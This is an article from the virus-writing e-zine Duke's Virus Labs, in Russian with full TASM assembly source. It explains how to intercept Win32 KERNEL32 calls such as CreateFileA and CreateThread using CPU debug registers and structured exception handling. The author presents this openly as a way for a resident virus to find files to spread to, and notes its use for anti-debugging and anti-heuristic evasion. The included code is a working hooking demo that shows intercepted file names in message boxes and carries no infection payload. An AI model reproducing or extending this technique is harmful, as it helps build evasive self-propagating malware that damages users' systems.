@@ -1,0 +1,976 @@
+- [Duke's Virus Labs #10] - [Page 18] -
+
+Перехват win32api c помощью hardware break point
+(c) by Voodoo/SMF
+
+
+Приветствую  тебя читатель, "писатель" ;) . В этой статье  речь пойдет 
+о перехвате функций KERNEL32.dll c помощью hardware break point. После 
+того как ваше "твАрение"  стало  резидентным на время процесса, возникает 
+вопрос как размножаться. Существует два пути решения этой проблемы. Первый: 
+запускаем независимую нитку которая будет искать на дисках нужные нам файлы. 
+Данный путь является простейшим, и для этого необязательно оставаться 
+резидентным. Второй: перехватываем win32api функции работы с файлами и у них 
+берем нужные нам файлы. Обычно меняют адреса функций в таблице импортов на 
+свои. При этом возникает проблема: прога не использует на прямую функции, а  
+вызывает их через GetProcAddress. Тут приходиться перехватывать GetProcAddress, 
+контролировать на предмет функций, которые мы перехватываем, и подставлять 
+свои адреса. Перехватывать можно меняя код функции кернела  непосредственно 
+в памяти. Например, на 
+                     push  NewMyFunction
+                     ret
+При этом следует сохранять старые инструкции, а  так же выполнять их. Для 
+разрешения записи в KERNEL32.dll  используется VirtualAllocEx. Под NT этот 
+метод вполне пригоден. Под 9х-ми возникает  проблема: VirtualAllocEx не может 
+открыть для записи код KERNEL32.dll, а если попытаться пропатчить из ring0, 
+то "код пропатчиться у всех процессов". 
+ Если почитать о i486 [1] , то можно наткнуться на главу  "Средства отладки".  
+В введении можно прочесть:  "Процессоры 80386 и i486 отличаются от 
+предшественников более богатым набором средств отладки. .... 
+  ....
+  Регистры отладки поддерживают контрольные точки по командам и данным. 
+В общем,  под контрольной точкой понимается адрес, при использовании которого 
+программой возникает особый случай отладки. Установка контрольной точки по 
+команде обеспечивает регистрацию выполнения команды по любому линейному адресу."
+При  возникновении особого случая отладки вызывается int 1. Обработать 
+его в ring3 весьма проблематично. Int 1  вызывается и при пошаговой отладке 
+программы. 
+ Как оказалось можно обработать этот случай отладки и в ring3. 
+Для этого используется SEH [2]. При возникновении случая отладки система 
+передает управление SEH-у данного потока который вызвал этот случай отладки,
+c его контекстом  и кодом исключения EXCEPTION_SINGLE_STEP. Все что от нас 
+требуется - обработать это исключение.
+ Таким образом, чтобы перехватить, скажем CreateFileA, нам нужно настроить 
+свой SEH,  загрузить в DR0 адрес CreateFileA, в DR7 установить биты RW0,
+LEN0 в 0, L0 в 1 и ждать пока нас вызовут :). Так как SEH есть у каждого 
+потока то наш HBP (hardware break point) будет работать лишь в контексте 
+данного потока. Т.е. если функция CreateFileA вызывается из новой нитки, то  
+мы ничего не поймаем. Выходом из данной ситуации является перехват 
+CreateThread. Перехватив CreateThread  мы меняем адрес нитки на адрес нашей 
+подпрограммы, которая настраивает SEH и устанавливает HBPs, в качестве 
+параметра потока (lpParameter) передадим адрес нитки, которая должна была 
+запускаться.  Получив этот параметр наша подпрограмма отдаст туда управление.  
+Было бы корректней передовать  указатель на структуру : 
+ dd  AddressOfNewThread 
+ dd  OdlLpParameter
+ а затем восстанавливать еще и старое значение lpParameter.
+       После обработке EXCEPTION_SINGLE_STEP следует снять HBP и 
+"включить"  пошаговый режим выполнения программы, установив в EFLAGS  TF=1. 
+После выполнения одной команды снова устанавливается HBP. Это необходимо для 
+предотвращения зацикливания.
+ Недостатком этого метода является малое количество регистров отладки: DR0-DR3.
+А так этот метод работает от win95 до win2k, т.е. является win32 совместимым.
+Реализация всего этого в коде находится в файле seh_tr.asm
+PS.
+Как показала практика, метод является неполным. А именно после того как мы, 
+перехватив обработчик, отдали управление проге, она устанавливает свои 
+обработчики. Эти обработчики не очень дружелюбны  по отношению к нам :(. 
+До нас очередь может просто не дойти. Так пропатчив calc.exe, в момент вызова 
+CreateThread возникало исключение (0x80000004) которое выгружало калк. Отладка 
+показала, что наш обработчик находится  3-м. Т.о. чтобы этот метод работал, 
+необходимо быть "первым". Как быть "первым"?  Этот вопрос еще предстоит решить.
+     Сам метод HBP может использоваться как анти - отладка, анти - евристика.
+
+Доп. Литература:
+[1]   В.Л. Григорьев  
+"Микропроцессор i486. Архитектура и программирование (в 4-х книгах)" 
+     книга 1
+[2]  http://members.xoom.com/Iczel/Exceptionhandling.html
+     http://members.xoom.com/Iczel/files/SEHinASM.zip
+
+
+===== begin seh_tr.asm =====
+; tasm    /m3 /ml seh_tr,,;
+; tlink32 /Tpe /aa seh_tr,seh_tr,,import32.lib
+                             .386p
+                             .model  flat
+             include  context.inc ; Описание структуры CONTEXT
+             include  wvoodoo.inc ; Описание кое-каких констант и экспортов
+             include  debug32.inc ; Описание кое-каких констант
+             include exeption.inc ; -//-
+                             .data
+                  kernelmane db "KERNEL32.dll",0
+               @CreateFileA  db "CreateFileA",0
+               @CreateThread db "CreateThread",0
+                    FileName db "qwerty.obj",0
+
+                  FileNameis db "File name is : ",0
+              @ErrSkip       db "Skip error",0
+                       @by   db "Bce ...",0
+@EXCEPTION_ACCESS_VIOLATION  db "EXCEPTION_ACCESS_VIOLATION",0
+@EXCEPTION_SINGLE_STEP       db "EXCEPTION_SINGLE_STEP",0
+@EXCEPTION_BREAKPOINT        db "EXCEPTION_BREAKPOINT",0
+                    RegEAX   db 'EAX = '
+                    @RegEAX  db 'XXXXXXXXh',0
+
+             @LpCreateFileA  dd ?
+             @LpCreateThread dd ?
+                  KillThread dd 0
+               include hexlib.inc   ;
+             include displayc.inc   ; Визуализация структуры CONTEXT
+        .code
+starts:
+           push offset kernelmane      ; Получим аддреса функций для брекпоинтов
+           call GetModuleHandleA       ;
+           push eax                    ;
+           push offset @CreateFileA    ;
+           push eax                    ;
+           call GetProcAddress         ;
+           call NTor9X                 ; Коррекция адреса в зависимости от ОС.
+           mov  @LpCreateFileA,eax     ;
+           pop eax                     ;
+           push offset @CreateThread   ;
+           push eax                    ;
+           call GetProcAddress         ;
+           call NTor9X                 ;
+           mov  @LpCreateThread,eax    ;
+
+           push offset SkipError       ; Настройка обработчика ошибок 
+           push    dword ptr fs:[0]    ;  xor eax,eax
+           mov     fs:[0],esp          ;  mov [eax],eax
+                                       
+           call SetMySEH               ; Собственно перехват функций
+    
+                                       ; Запускаем процедуру открытия файлa 
+				       ; и наблюдаем за MessageBox-ами, 
+           call CreatF                 ; обращая внимание на EIP и DR0.
+
+           xor eax,eax                 ; Обнуляем флаг завершения потока.
+           mov KillThread,eax          ;
+
+           mov [eax],eax               ; Генирим ошибку, которую обработает SkipError.
+
+           push ecx                    ; Создаем поток CreateF с параметром 0x12345678.
+           push esp                    ;
+           push 0                      ;
+           push 12345678h              ;
+           push offset CreatF          ;
+           push 0                      ;
+           push 0                      ;
+           call CreateThread           ; Здесь выскочит MessageBox c параметром потока CreateF.
+           pop ecx                     ;
+
+           WaitThread:                 ; Ждем завершения потока.
+           mov eax,KillThread          ;
+           or eax,eax                  ;
+           jz WaitThread               ;
+MdExit:
+           push 0                      ; Вот и все ...
+           push offset @by             ;
+           push offset @by             ;
+           push 0                      ;
+           call MessageBoxA            ;
+                                       ;
+           push 0                      ;
+           call ExitProcess            ;
+;------------------------------------------------------------------------
+; Коррекция адреса в зависимости от ОС.
+; В 9x-ax после GetProcAddress('KERNEL32.dll','CreateFileA') eax  указывает на следующий код :
+;    push  offsett CreateFileA
+;    jmp XXXXX
+; А нам нужно только offset CreateFileA , т.к. если мы установим 
+; HBP  на ентот код,(как показали испытания с SoftIce-oм) нас вряд ли 
+; ктонить вызовет,что крайне нежелательно ;).
+;
+NTor9X:
+           cmp byte ptr [eax],068h
+           jne NTKernel1
+           mov eax,[eax+1]
+           NTKernel1:
+           ret
+;------------------------------------------------------------------------
+
+SetMySEHThread:
+           mov ebx,[ebp+12] ; Здесь можно найти параметры потока
+           jmp  SetMySEH+1
+SetMySEH:  pop ebx
+
+           push offset TraceProc
+           push    dword ptr fs:[0]
+           mov     fs:[0],esp
+           xor eax,eax
+excep1:    mov eax,[eax]
+nEXTdEBUG:
+           push offset RetPrevSEH ; Корректный выход из "нашего" потока
+           push ebx
+           ret
+;------------------------------------------------------------------------
+; Для завершения потока по ret  вернем,  старый обработчик SEH 
+; и выйдем из потока.
+RetPrevSEH:
+           xor edx,edx               
+           pop dword ptr fs:[edx]    
+           pop edx                   
+           ret                       
+;------------------------------------------------------------------------
+; Открытие и закрытие файла. 
+CreatF:
+           push 0
+           push FILE_ATTRIBUTE_ARCHIVE
+           push OPEN_EXISTING
+           push 0
+           push FILE_SHARE_READ
+           push GENERIC_READ
+           push offset FileName
+           call CreateFileA
+           push eax
+           call CloseHandle
+
+           push 0
+           push FILE_ATTRIBUTE_ARCHIVE
+           push OPEN_EXISTING
+           push 0
+           push FILE_SHARE_READ
+           push GENERIC_READ
+           push offset FileName
+           call CreateFileA
+           push eax
+           call CloseHandle
+
+           mov eax,1
+           mov KillThread,eax
+           ret
+;------------------------------------------------------------------------
+; Наш обработчик исключений
+  TraceProc:
+            push edi
+            push esi
+            mov edi,[esp+4+8]      ; EXEPTION_STURC
+            mov esi,[esp+0ch+8]    ; eax=Lp2CONTEXT
+            pusha
+            mov eax,[edi]
+            cmp eax,EXCEPTION_ACCESS_VIOLATION
+            ; Если не EXCEPTION_ACCESS_VIOLATION смотрим далее
+            jne NextExc1
+            mov eax,[esi+@_EIP]
+            cmp eax,offset excep1
+            ; Если не "наша" ошибка отдаем управление старому обработчику.
+            jne NextExcSys
+
+            mov ebp,offset @EXCEPTION_ACCESS_VIOLATION
+            call DisplayCONTEXT
+            
+            mov eax,offset   nEXTdEBUG        ; Скипим ошибку
+            mov [esi+@_EIP],eax               ;
+
+            call SetHardwareBreakPoints
+
+            jmp ExcepEnd                     ; Завершаем исключение.
+
+ NextExc1:  cmp eax,EXCEPTION_SINGLE_STEP
+            jne NextExc2
+
+            mov ebp,offset @EXCEPTION_SINGLE_STEP
+            call DisplayCONTEXT
+
+            mov eax,[esi+@_EIP]
+            cmp eax,@LpCreateThread
+            ; Если EIP=CreateThread  обработать вызов CreateThread
+            je HookCreateThread
+
+            cmp eax,@LpCreateFileA
+            ; Если (EIP<>CreateFileA)&(EIP<>CreateThread) установим HBP
+            jne SetHardwareBP
+
+            mov eax,[esi+@_ESP] ; Загружаем указатель стека у функции CreateFileA
+            add eax,4
+            push 0
+            push offset FileNameis
+            push dword ptr [eax] ; Смещение на имя открываемого файла.
+            push 0
+            call MessageBoxA     ; Покажем его.
+
+SkipHBP:
+            xor eax,eax          ; Отключаем все HBPs
+            mov [esi+@_DR7],eax  ;
+
+            mov [esi+@_DR6],eax  ; Очистка DR6
+            ; Включаем режим пошаговой отладки.
+            or dword ptr [esi+@EFlags],100h ; set TF
+
+            jmp ExcepEnd
+
+SetHardwareBP:
+            call SetHardwareBreakPoints
+            jmp ExcepEnd
+
+; Перехватчик  CreateThread
+HookCreateThread:
+            mov eax,[esi+@_ESP] ; Загружаем указатель стека у функции  CreateThread
+            add eax,12
+            push eax
+            mov eax,[eax]       ; Адрес потока.
+            call EAX2HEX
+            mov edi,offset @RegEAX
+            call EBXEDX2STR
+            push 0
+            push offset @CreateThread
+            push offset  RegEAX
+            push 0
+            call MessageBoxA   ; Покажем его.
+            ;В качестве нового параметра будет адрес  потока.
+            pop eax            
+            mov edx,[eax]      
+            mov [eax+4],edx    
+            ;В качестве нового адреса  потока будет SetMySEHThread.
+            mov edx,offset SetMySEHThread
+            mov [eax],edx            ; New Thread address
+            
+            jmp SkipHBP
+;  Обработчик int 3
+ NextExc2:  cmp eax, EXCEPTION_BREAKPOINT
+            jne NextExcSys
+            mov ebp,offset @EXCEPTION_BREAKPOINT
+            call DisplayCONTEXT
+            dec eax
+            jnz Exit2Md
+            inc dword ptr [esi+@_EIP]
+; Завершение исключения
+ExcepEnd:   popa
+            pop esi
+            pop edi
+            xor eax,eax
+            ret
+; Передача управление далее по цепочке SEH
+NextExcSys: popa
+            pop esi
+            pop edi
+            xor eax,eax
+            inc eax
+            ret
+;------------------------------------------------------------------------
+Exit2Md:    mov eax,offset MdExit
+            mov [esi+@_EIP],eax
+            jmp ExcepEnd
+;------------------------------------------------------------------------
+SkipError:
+            push edi
+            push esi
+            mov edi,[esp+4+8] ; EXEPTION_STURC
+            mov esi,[esp+0ch+8]    ; eax=Lp2CONTEXT
+            pusha
+            mov ebp,offset @ErrSkip
+            call DisplayCONTEXT
+            mov eax,[edi]
+            cmp eax,EXCEPTION_ACCESS_VIOLATION
+            jne NextExcSys
+            inc dword ptr [esi+@_EIP]
+            inc dword ptr [esi+@_EIP]
+            jmp ExcepEnd
+;-----------------------------------------------------------------
+SetHardwareBreakPoints:
+            mov eax,@LpCreateFileA            ;Загружаем регистр DR0
+            mov [esi+@_DR0],eax
+
+            mov eax,@LpCreateThread           ;Загружаем регистр DR1
+            mov [esi+@_DR1],eax
+
+            xor eax,eax
+            inc eax
+            or eax,Dr7BPX1L
+            mov [esi+@_DR7],eax              ; Загружаем регистр DR7
+            ret
+end    starts
+===== end   seh_tr.asm =====
+
+===== begin context.inc =====
+;
+FLOATING_SAVE_AREA		STRUC
+ControlWord		DD		?
+StatusWord		DD		?
+TagWord	                DD		?
+ErrorOffset		DD		?
+ErrorSelector		DD		?
+DataOffset		DD		?
+DataSelector		DD		?
+RegisterArea		DB 	80 DUP (?)
+Cr0NpxState		DD		?
+FLOATING_SAVE_AREA		ENDS
+
+_CONTEXT		STRUC
+@ContextFlags   equ             0
+ContextFlags	DD      	?
+
+@_Dr0           EQU             4
+_Dr0		DD		?
+
+@_Dr1           EQU             8
+_Dr1		DD		?
+
+@_Dr2           EQU             12
+_Dr2    	DD              ?
+
+@_Dr3           EQU             16
+_Dr3		DD		?
+
+@_Dr6           EQU             20
+_Dr6		DD		?
+
+@_Dr7           EQU             24
+_Dr7		DD		?
+
+@FloatSave      EQU             28
+FloatSave       FLOATING_SAVE_AREA <>
+@_Gs            EQU            08ch
+_Gs		DD		?
+
+@_Fs            EQU             90h
+_Fs		DD		?
+
+@_Es            EQU             94h
+_Es		DD		?
+
+@_Ds            EQU             98h
+_Ds		DD		?
+
+@_Edi           EQU             9ch
+_Edi		DD		?
+
+@_Esi           equ             0A0h
+_Esi		DD		?
+
+@_Ebx           EQu             0a4h
+_Ebx		DD		?
+
+@_Edx           equ             0a8h
+_Edx		DD		?
+
+@_Ecx           equ             0ach
+_Ecx		DD		?
+
+@_Eax           equ             0b0h
+_Eax		DD		?
+
+@_Ebp           equ             0b4h
+_Ebp		DD		?
+
+@_Eip           equ             0b8h
+_Eip		DD		?
+
+@_Cs            equ            0bch
+_Cs		DD		?
+
+@EFlags         equ             0c0h
+EFlags		DD		?
+
+@_Esp           equ             0c4h
+_Esp		DD		?
+
+@_Ss            equ             0c8h
+_Ss		DD		?
+_CONTEXT		ENDS
+===== end   context.inc =====
+
+===== begin debug32.inc =====
+Dr7BPX0L EQU 0000000000000000000000000000001b
+Dr7BPX0G EQU 0000000000000000000000000000010b
+Dr7BPX1L EQU 0000000000000000000000000000100b
+Dr7BPX1G EQU 0000000000000000000000000001000b
+Dr7BPX2L EQU 0000000000000000000000000010000b
+Dr7BPX2G EQU 0000000000000000000000000100000b
+Dr7BPX3L EQU 0000000000000000000000001000000b
+Dr7BPX3G EQU 0000000000000000000000010000000b
+===== end   debug32.inc =====
+
+===== begin dislplayc.inc =====
+            MSG1 db 'ContextFlag='
+ContextFlag      db 'XXXXXXXX',0ah,0dh
+                 db 'EAX = '
+            rEAX db 'XXXXXXXX',0ah,0dh
+                 db 'EBX = '
+            rEBX db 'XXXXXXXX',0ah,0dh
+                 db 'ECX = '
+            rECX db 'XXXXXXXX',0ah,0dh
+                 db 'EDX = '
+            rEDX db 'XXXXXXXX',0ah,0dh
+                 db 'ESI = '
+            rESI db 'XXXXXXXX',0ah,0dh
+                 db 'EDI = '
+            rEDI db 'XXXXXXXX',0ah,0dh
+                 db 'EBP = '
+            rEBP db 'XXXXXXXX',0ah,0dh
+                 db 'ESP = '
+            rESP db 'XXXXXXXX',0ah,0dh
+                 db 'EIP = '
+            rEIP db 'XXXXXXXX',0ah,0dh
+                 db 'DR0 = '
+            rDR0 db 'XXXXXXXX',0ah,0dh
+                 db 'DR1 = '
+            rDR1 db 'XXXXXXXX',0ah,0dh
+                 db 'DR2 = '
+            rDR2 db 'XXXXXXXX',0ah,0dh
+                 db 'DR3 = '
+            rDR3 db 'XXXXXXXX',0ah,0dh
+                 db 'DR6 = '
+            rDR6 db 'XXXXXXXX',0ah,0dh
+                 db 'DR7 = '
+            rDR7 db 'XXXXXXXX',0ah,0dh
+                 db 'CS = '
+             rCS db 'XXXXXXXX',0ah,0dh
+                 db 'DS = '
+            rDS db 'XXXXXXXX',0ah,0dh
+                 db 'ES = '
+            rES db 'XXXXXXXX',0ah,0dh
+                 db 'FS = '
+            rFS db 'XXXXXXXX',0ah,0dh
+                 db 'GS = '
+            rGS db 'XXXXXXXX',0ah,0dh
+                 db 'SS = '
+            rSS db 'XXXXXXXX',0ah,0dh
+                 db 'Command : '
+         Command db '                                    ',0
+;--------------------
+; in : esi=LpCONTEXT
+DisplayCONTEXT:
+       push edi
+       mov eax,[esi+@ContextFlags]
+       call EAX2HEX
+       mov edi,offset ContextFlag
+       call EBXEDX2STR
+       mov eax,[esi+@_EAX]
+       call EAX2HEX
+       mov edi,offset rEAX
+       call EBXEDX2STR
+
+       mov eax,[esi+@_EBX]
+       call EAX2HEX
+       mov edi,offset rEBX
+       call EBXEDX2STR
+
+       mov eax,[esi+@_ECX]
+       call EAX2HEX
+       mov edi,offset rECX
+       call EBXEDX2STR
+
+       mov eax,[esi+@_EDX]
+       call EAX2HEX
+       mov edi,offset rEDX
+       call EBXEDX2STR
+
+       mov eax,[esi+@_ESI]
+       call EAX2HEX
+       mov edi,offset rESI
+       call EBXEDX2STR
+
+       mov eax,[esi+@_EDI]
+       call EAX2HEX
+       mov edi,offset rEDI
+       call EBXEDX2STR
+
+       mov eax,[esi+@_EBP]
+       call EAX2HEX
+       mov edi,offset rEBP
+       call EBXEDX2STR
+
+       mov eax,[esi+@_ESP]
+       call EAX2HEX
+       mov edi,offset rESP
+       call EBXEDX2STR
+
+       mov eax,[esi+@_EIP]
+       call EAX2HEX
+       mov edi,offset rEIP
+       call EBXEDX2STR
+
+       mov eax,[esi+@_DR0]
+       call EAX2HEX
+       mov edi,offset rDR0
+       call EBXEDX2STR
+
+       mov eax,[esi+@_DR1]
+       call EAX2HEX
+       mov edi,offset rDR1
+       call EBXEDX2STR
+
+       mov eax,[esi+@_DR2]
+       call EAX2HEX
+       mov edi,offset rDR2
+       call EBXEDX2STR
+
+       mov eax,[esi+@_DR3]
+       call EAX2HEX
+       mov edi,offset rDR3
+       call EBXEDX2STR
+
+       mov eax,[esi+@_DR6]
+       call EAX2HEX
+       mov edi,offset rDR6
+       call EBXEDX2STR
+
+       mov eax,[esi+@_DR7]
+       call EAX2HEX
+       mov edi,offset rDR7
+       call EBXEDX2STR
+
+       mov eax,[esi+@_CS]
+       call EAX2HEX
+       mov edi,offset rCS
+       call EBXEDX2STR
+
+       mov eax,[esi+@_DS]
+       call EAX2HEX
+       mov edi,offset rDS
+       call EBXEDX2STR
+
+       mov eax,[esi+@_ES]
+       call EAX2HEX
+       mov edi,offset rES
+       call EBXEDX2STR
+
+       mov eax,[esi+@_FS]
+       call EAX2HEX
+       mov edi,offset rFS
+       call EBXEDX2STR
+
+       mov eax,[esi+@_GS]
+       call EAX2HEX
+       mov edi,offset rGS
+       call EBXEDX2STR
+
+       mov eax,[esi+@_SS]
+       call EAX2HEX
+       mov edi,offset rSS
+       call EBXEDX2STR
+       pop edi
+       push 1
+       push ebp
+       push offset MSG1
+       push 0
+       call MessageBoxA
+       ret
+EBXEDX2STR:
+       mov eax,ebx
+       call HEXEAX2STR
+       mov eax,edx
+       call HEXEAX2STR
+       ret
+HEXEAX2STR:
+       mov ecx,4
+       NextChar:
+       rol eax,8
+       cld
+       stosb
+       loop NextChar
+       ret
+===== end   displayc.inc =====
+
+===== begin exeption.inc =====
+DEBUG   EQU 1  ; Так отладка возможна.
+NODEBUG EQU 0  ; А так затрудняется
+DEBUGFLAG EQU DEBUG
+
+         EXCEPTION_SINGLE_STEP EQU 080000004h
+         EXCEPTION_BREAKPOINT EQU 080000003h
+   EXCEPTION_ACCESS_VIOLATION EQU 0C0000005h
+EXCEPTION_ILLEGAL_INSTRUCTION EQU 0C000001Dh
+
+ IF DEBUGFLAG
+    EXEPTION EQU dw 0ffffh,090c3h,9090h
+    ELSE
+    EXEPTION EQU db 0cch
+ ENDIF
+ IF DEBUGFLAG
+  BreakPoint EQU db 0cch
+    ELSE
+  BreakPoint EQU ;
+ ENDIF
+
+callEx macro Arg
+       ; call Arg
+       push z&Arg
+       exeption
+       endm
+===== end   exeption.inc =====
+
+===== begin hexlib.inc =====
+;;макроопределение для визуализации регистров al, ah, ax, eax
+;;на входе:
+;;arg_n - имя одного из регистров al,ah,ax,eax
+;;на выходе:
+;;     dx=Hex8bit
+;;    edx=Hex16Bit
+;;ebx:edx=Hex32bit
+Hex	MACRO	arg_n
+LOCAL	main_part,disp,pause,template,VideoBuffer,p_mode,m1,m2,Load2Video
+FALSE	equ	0	;;ложь
+TRUE	equ	0ffffh	;;истина
+?reg8bit=false	;;флаг того, что передан регистр al
+?reg16bit=false	;;флаг того, что передан регистр ax
+?reg32bit=false	;;флаг того, что передан регистр eax
+?unknow=false
+ IFIDNI <al>,<&arg_n>
+        ?reg8bit=true
+        ?unknow=true
+        ENDIF
+    IFIDNI <ax>,<&arg_n>
+        ?reg16bit=true
+        ?unknow=true
+        ENDIF
+    IFIDNI <eax>,<&arg_n>
+        ?reg32bit=true
+        ?unknow=true
+        ENDIF
+    IF (?unknow)
+     IF (?reg8bit)
+        push eax
+        and al,00001111b
+        call AL2HEX
+        mov dl,al
+        pop eax
+        and al,11110000b
+        shr al,4
+        call AL2HEX
+        mov dh,al
+        ;; dx=al in HEX
+        ENDIF
+    IF (?reg16bit)
+        push eax
+        mov al,ah
+        and al,00001111b
+        call AL2HEX
+        mov dl,al
+        pop eax
+        push eax
+        and al,11110000b
+        shr al,4
+        call AL2HEX
+        mov dh,al
+        ;; dx=ah in HEX
+        shl edx,16
+        pop eax
+        and al,00001111b
+        call AL2HEX
+        mov dl,al
+        pop eax
+        push eax
+        and al,11110000b
+        shr al,4
+        call AL2HEX
+        mov dh,al
+        ;; edx=ax in HEX
+        ENDIF
+ IF (?reg32bit)                 ;; eax=AB CD EF 12h
+         push eax
+         shr eax,8+8+8
+         push ax                ;; ax=ABh
+         shr al,4
+         call AL2HEX
+         mov bh,al               ;; bh='A'
+         pop ax
+         and al,00001111b
+         call AL2HEX
+         mov bl,al               ;; bl='B'
+         shl ebx,16              ;; Hi(ebx)='AB'
+        pop eax
+        push eax
+          shr eax,8+8
+          push ax       ;; ax=CDh
+          shr al,4
+          ;; al=Ch
+          call AL2HEX
+          mov bh,al               ;; bh='C'
+          pop ax
+          and al,00001111b
+          call AL2HEX
+          mov bl,al               ;; bl='D'
+                                  ;; bx='CD'
+        pop eax
+        push eax
+           shr eax,8
+           push ax   ;; ax=EFh
+           shr al,4
+           ;; al=Eh
+           call AL2HEX
+           mov dh,al               ;; dh='E'
+           pop ax
+           and al,00001111b
+           call AL2HEX
+          mov dl,al               ;; dl='F'
+          shl edx,16              ;; HI(edx)='EF'
+        pop eax
+           push ax   ;; ax=12h
+           shr al,4  ;; al=1h
+           call AL2HEX
+           mov dh,al  ; dh='1'
+           pop ax
+           and al,00001111b
+           call AL2HEX
+           mov dl,al               ;; dl='2'   -> dx='12'
+         ;;ebx='ABCD', EDX='EF12'
+        ENDIF
+   ENDIF
+   ENDM
+EAX2HEX:
+        Hex eax
+        ret
+AX2HEX: Hex ax
+        ret
+AltoHEX: Hex al
+         ret
+
+AL2HEX:add al,90h
+       daa
+       adc al,3ah
+       daa
+       ret
+===== end   hexlib.inc =====
+
+===== begin wvoodoo.inc =====
+NULL = 0
+; GlobalAlloc flags
+GMEM_FIXED      =   0000h
+GMEM_MOVEABLE   =   0002h
+GMEM_NOCOMPACT  =   0010h
+GMEM_NODISCARD  =   0020h
+GMEM_ZEROINIT   =   0040h
+GMEM_MODIFY     =   0080h
+GMEM_DISCARDABLE=   0100h
+GMEM_NOT_BANKED =   1000h
+GMEM_DDESHARE   =   2000h
+GMEM_SHARE      =   2000h
+GMEM_NOTIFY     =   4000h
+GMEM_LOWER      =   GMEM_NOT_BANKED
+GHND            =   GMEM_MOVEABLE+GMEM_ZEROINIT
+GPTR            =   GMEM_FIXED+GMEM_ZEROINIT
+;-----------
+ FILE_ATTRIBUTE_READONLY     =    00000001h
+ FILE_ATTRIBUTE_HIDDEN       =    00000002h
+ FILE_ATTRIBUTE_SYSTEM       =    00000004h
+ FILE_ATTRIBUTE_DIRECTORY    =    00000010h
+ FILE_ATTRIBUTE_ARCHIVE      =    00000020h
+ FILE_ATTRIBUTE_NORMAL       =    00000080h
+ FILE_ATTRIBUTE_TEMPORARY    =    00000100h
+;-----------
+FILE_FLAG_WRITE_THROUGH         = 80000000h
+FILE_FLAG_OVERLAPPED            = 40000000h
+FILE_FLAG_NO_BUFFERING          = 20000000h
+FILE_FLAG_RANDOM_ACCESS         = 10000000h
+FILE_FLAG_SEQUENTIAL_SCAN       = 08000000h
+FILE_FLAG_DELETE_ON_CLOSE       = 4000000h
+FILE_FLAG_BACKUP_SEMANTICS      = 02000000h
+FILE_FLAG_POSIX_SEMANTICS       = 01000000h
+
+;------------------------
+CREATE_NEW         = 1
+CREATE_ALWAYS      = 2
+OPEN_EXISTING      = 3
+OPEN_ALWAYS        = 4
+TRUNCATE_EXISTING  = 5
+
+;-----------
+GENERIC_READ               = 80000000h
+GENERIC_WRITE              = 40000000h
+FILE_SHARE_READ            = 00000001h
+FILE_SHARE_WRITE           = 00000002h
+;-----------
+ PAGE_NOACCESS          = 01h
+ PAGE_READONLY          = 02h
+ PAGE_READWRITE         = 04h
+ PAGE_WRITECOPY         = 08h
+ PAGE_EXECUTE           = 10h
+ PAGE_EXECUTE_READ      = 20h
+ PAGE_EXECUTE_READWRITE = 40h
+ PAGE_EXECUTE_WRITECOPY = 80h
+ PAGE_GUARD             = 100h
+ PAGE_NOCACHE           = 200h
+;-------------------
+FILE_MAP_WRITE = 2
+FILE_MAP_READ  = 4
+;-------------------
+ NORMAL_PRIORITY_CLASS      = 00000020h
+ IDLE_PRIORITY_CLASS        = 00000040h
+ HIGH_PRIORITY_CLASS        = 00000080h
+ REALTIME_PRIORITY_CLASS    = 00000100h
+;--------------------
+EXCEPTION_DEBUG_EVENT      = 1
+CREATE_THREAD_DEBUG_EVENT  = 2
+CREATE_PROCESS_DEBUG_EVENT = 3
+EXIT_THREAD_DEBUG_EVENT    = 4
+EXIT_PROCESS_DEBUG_EVENT   = 5
+LOAD_DLL_DEBUG_EVENT       = 6
+UNLOAD_DLL_DEBUG_EVENT     = 7
+OUTPUT_DEBUG_STRING_EVENT  = 8
+RIP_EVENT                  = 9
+;--------------------
+PROCESS_ALL_ACCESS  =   0F0000h or 00100000h or 0FFFh
+;--------------------locals
+        extrn   MessageBoxA:PROC
+        extrn   Sleep:PROC
+        extrn   ExitProcess:PROC
+        extrn   CreateThread:PROC
+        extrn   GetLastError:PROC
+        extrn   GetModuleHandleA:PROC
+        extrn   ExitProcess:PROC
+        extrn   GetProcAddress:PROC
+        extrn   GetModuleHandleA:PROC
+        extrn   GetCurrentThread:PROC
+        extrn   VirtualProtectEx:PROC
+        extrn   DebugActiveProcess:Proc
+        extrn   OpenProcess:PROC
+        extrn   WriteProcessMemory:PROC
+        extrn   SuspendThread:PROC
+        extrn   GetCurrentProcessId:PROC
+        extrn   LoadLibraryA:PROC
+        extrn   MessageBoxA:PROC
+        extrn   MessageBeep:PROC
+        extrn   GlobalAlloc:PROC ; retern HGLOBAL
+                ; UINT Flags  object allocation attributes
+                ; DWORD dwBytes mumber of bytes to allocate
+        extrn   GlobalLock:PROC ;Pointer to mem
+                ; HGLOBAL hMem address of global memory object
+        extrn   GlobalUnlock:PROC
+                ; HGLOBAL hMem address of global memory object
+        extrn   GlobalFree:PROC
+                ;HGlobal hMem handle to the global memory object
+     ;---- file mapping --------------------------------------
+      extrn CreateFileA:PROC
+     ;Retern HANDLE
+     ;Parametrs:    LPCTSTR :LpFileName
+     ;              DWORD   :dwDesiredAccess (read-write)
+     ;              DWORD   : dwShareMode
+     ; LPSECURITY_ATTRIBTES :LpSecurityAttrib address of security descriptor
+     ;              DWORD   :dwCreationDistribution //how to creat
+     ;              DWORD   :dwFlagsAndAttributes
+     ;             HANDLE   :hTemplateFile //handle of file with attrib to copy
+     extrn CreateFileMappingA:PROC
+     ;Retern HANDLE
+     ; PARAMMETRS    HANDLE :hfile    //handle of file map
+     ;  LpSecurity_Attributes LpFileMappingAttributes //optional security attrib
+     ;  Dword  :flProtect
+     ;  Dword  :dwMaxSizeHigh
+     ;  Dword  :dwMaxSizeLow
+     ; LPCTSTR :lpName //name of file-mapping object
+     extrn MapViewOfFile:PROC ;(hFileMappingObject:HANDLE,
+                              ;  dwDesiredAccess:dw,
+                              ;  dwFileOffsetHigh,
+                              ;  dwFileOffsetLow,
+                              ;  dwNumberOfBytesToMap)
+     ;
+     ;
+     ;
+     extrn UnmapViewOfFile:PROC
+     extrn CloseHandle:PROC
+     extrn FlushViewOfFile:PROC;(LpBaseAddress,dwNumberOfBytesToFlush)
+    ;--------------------------------------------------------
+     extrn GetFileSize:PROC ; (hFile,LPDWORD LpFileSizeHigh)
+     extrn CopyFileA:PROC ;(LpExistingFileName,LpNewFileName)
+     extrn ReadFile:PROC  ;(hFile,LpBuffer,nMumberOfBytesToRead,
+     ;                    LpNumberOfBytesRead,LpOverlapped)
+     extrn DeleteFileA    :PROC;(LpFileName)
+     extrn GetLastError  :PROC;
